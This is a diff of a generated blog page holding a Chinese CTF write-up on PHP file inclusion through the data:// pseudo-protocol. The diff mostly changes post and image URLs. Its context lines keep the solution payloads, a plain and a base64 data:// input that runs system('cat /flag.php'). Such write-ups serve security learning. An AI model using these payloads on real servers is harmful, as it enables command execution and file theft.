@@ -22,19 +22,19 @@
     <meta name="description" content="题目源码 123456789101112131415161718192021 &lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:10:14# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 11:12:38# @email: h1xa">
 <meta property="og:type" content="article">
 <meta property="og:title" content="web79-文件包含-data伪协议">
-<meta property="og:url" content="https://yschen20.github.io/2025/05/25/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.html">
+<meta property="og:url" content="https://yschen20.github.io/2025/05/25/ctfshow-web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.html">
 <meta property="og:site_name" content="(๑´ڡ&#96;๑)">
 <meta property="og:description" content="题目源码 123456789101112131415161718192021 &lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:10:14# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 11:12:38# @email: h1xa">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yschen20.github.io/2025/05/25/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195007186.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/05/25/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195110043.png">
-<meta property="og:image" content="https://yschen20.github.io/2025/05/25/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195231088.png">
+<meta property="og:image" content="https://yschen20.github.io/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195007186.png">
+<meta property="og:image" content="https://yschen20.github.io/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195110043.png">
+<meta property="og:image" content="https://yschen20.github.io/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195231088.png">
 <meta property="article:published_time" content="2025-05-25T01:06:05.000Z">
 <meta property="article:modified_time" content="2025-05-29T04:29:54.900Z">
 <meta property="article:author" content="Suzen">
 <meta property="article:tag" content="文件包含 伪协议">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://yschen20.github.io/2025/05/25/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195007186.png">
+<meta name="twitter:image" content="https://yschen20.github.io/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195007186.png">
 <meta name="twitter:creator" content="@Suzen">
   
   
@@ -313,12 +313,12 @@
 <p>可以使用<code>data://</code>伪协议执行命令</p>
 <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag.php&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/05/25/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195007186.png" srcset="/img/loading.gif" lazyload alt="image-20250519195007186"></p>
+<p><img src="/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195007186.png" srcset="/img/loading.gif" lazyload alt="image-20250519195007186"></p>
 <p>直接使用没回显，加上base64进行编码</p>
-<p><img src="/2025/05/25/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195110043.png" srcset="/img/loading.gif" lazyload alt="image-20250519195110043"></p>
+<p><img src="/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195110043.png" srcset="/img/loading.gif" lazyload alt="image-20250519195110043"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcucGhwJyk7Pz4=<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/05/25/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195231088.png" srcset="/img/loading.gif" lazyload alt="image-20250519195231088"></p>
+<p><img src="/web79-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-data%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20250519195231088.png" srcset="/img/loading.gif" lazyload alt="image-20250519195231088"></p>
 <p>也可以使用大写绕过对<code>php</code>的过滤，但是可能会不知道<code>flag</code>的文件名，而且<code>flag.php</code>也有<code>php</code>不好绕过</p>
 
                 
@@ -373,7 +373,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>web79-文件包含-data伪协议</div>
-      <div>https://yschen20.github.io/2025/05/25/web79-文件包含-data伪协议/</div>
+      <div>https://yschen20.github.io/2025/05/25/ctfshow-web79-文件包含-data伪协议/</div>
     </div>
     <div class="license-meta">
       
@@ -422,7 +422,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/05/25/web80-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-input%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="web80-文件包含-input伪协议">
+                      <a href="/2025/05/25/ctfshow-web80-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-input%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="web80-文件包含-input伪协议">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">web80-文件包含-input伪协议</span>
                         <span class="visible-mobile">上一篇</span>
@@ -432,7 +432,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/05/25/web78-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="web78-文件包含-filter伪协议">
+                      <a href="/2025/05/25/ctfshow-web78-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="web78-文件包含-filter伪协议">
                         <span class="hidden-mobile">web78-文件包含-filter伪协议</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
